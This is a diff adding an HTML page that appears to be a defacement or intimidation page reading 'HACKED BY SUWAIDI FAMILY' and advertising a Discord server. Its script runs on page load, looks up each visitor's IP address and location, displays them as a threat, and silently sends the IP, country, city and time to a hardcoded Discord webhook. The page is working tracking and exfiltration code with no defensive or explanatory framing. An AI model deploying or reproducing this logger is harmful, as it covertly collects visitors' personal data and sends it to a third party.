@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PSYCHO & CJ</title>
+
+  <!-- Orbitron Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      color: white !important;
+      font-family: 'Orbitron', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: black;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      text-align: center;
+      overflow: hidden;
+    }
+
+    #intro {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 105%;
+      height: 100vh;
+      background: black;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.6em;
+      text-shadow: 0 0 10px #ffffffaa, 0 0 25px #999999aa;
+      z-index: 9999;
+      letter-spacing: 7px;
+      text-transform: uppercase;
+    }
+
+    .content {
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 1;
+      position: relative;
+      height: 100vh;
+      width: 100%;
+    }
+
+    .background-video-second {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: -1;
+    }
+
+    .info {
+      margin-top: 20px;
+      font-size: 1.1em;
+      text-shadow: 0 0 8px white, 0 0 15px gray, 0 0 25px gray;
+      letter-spacing: 4.5px;
+      white-space: pre-wrap;
+    }
+
+    .text {
+      margin-top: 20px;
+      font-size: 2em;
+      text-shadow: 0 0 8px white, 0 0 15px gray, 0 0 25px gray;
+      letter-spacing: 4.5px;
+    }
+
+    .marquee {
+      position: absolute;
+      top: 10%;
+      width: 100%;
+      overflow: hidden;
+      white-space: nowrap;
+    }
+
+    .marquee span {
+      display: inline-block;
+      font-size: 3.5em;
+      text-shadow: 0 0 8px white, 0 0 15px gray, 0 0 25px gray;
+      letter-spacing: 4.5px;
+      animation: scroll 80s linear infinite;
+    }
+
+    @keyframes scroll {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
+
+    .image-container img {
+      max-width: 50%;
+      height: auto;
+      margin: 20px auto;
+      display: block;
+      filter: drop-shadow(0 0 0 white) drop-shadow(0 0 2px gray) drop-shadow(0 0 4px gray);
+    }
+  </style>
+</head>
+<body>
+
+  <!-- شاشة البداية -->
+  <div id="intro">
+Alsuwaidi is in the system..
+
+  </div>
+
+  <!-- المحتوى -->
+  <div class="content">
+    <video class="background-video-second" autoplay loop muted>
+      <source src="https://cdn.discordapp.com/attachments/1198953984623382548/1321493312032608347/We_Are_FSociety.mov?ex=6871278d&is=686fd60d&hm=fb0cd8c96e4d1ba19e6aef6db30a431ffa787bb24cd75ede6bb32ef36f878879&" type="video/mp4">
+      Your browser does not support the video tag.
+    </video>
+
+    <div class="marquee">
+      <span>DISCORD.GG/SWD - DISCORD.GG/SWD - DISCORD.GG/SWD</span>
+    </div>
+
+    <div id="content">
+      <div class="image-container">
+        <img src="ht=" alt="">
+      </div>
+
+      <div class="info" id="ip-info">Loading IP Info...</div>
+      <div class="text">DISCORD.GG/SWD</div>
+
+      <audio autoplay loop>
+        <source src="https://cdn.discordapp.com/attachments/1198953984623382548/1321493712450224160/78C63D9C-A541-428D-B3F8-5BF465756A5C.mov?ex=687127ed&is=686fd66d&hm=3dbf5bc88a6f8739db508d7fecd12f8ebfab2b821de8925ce651ae015ef83321&" type="audio/mpeg">
+        Your browser does not support the audio element.
+      </audio>
+    </div>
+  </div>
+
+  <script>
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+        const { ip, country, city, loc } = data;
+        const infoDiv = document.getElementById('ip-info');
+        infoDiv.innerHTML = `<strong>HACKED BY SUWAIDI FAMILY</strong><br>
+<strong>YOUR IP:</strong> ${ip}<br>
+<strong>YOUR LOCATION:</strong> ${loc}`;
+
+        const dateTime = new Date().toLocaleString();
+        const webhookUrl = 'https://discord.com/api/webhooks/1342711596035604511/c2zeLZnSp0faGn2G7rnFX6NOdOt1ewLys7Sp55NJt1p1A6FIkFkDciidXSyaV7_3WGie';
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`
+          })
+        });
+      });
+
+    setTimeout(() => {
+      document.getElementById('intro').style.display = 'none';
+      document.querySelector('.content').style.display = 'flex';
+    }, 1700); /* تم تعديل الوقت إلى 1.7 ثانية */
+  </script>
+
+</body>
+</html>
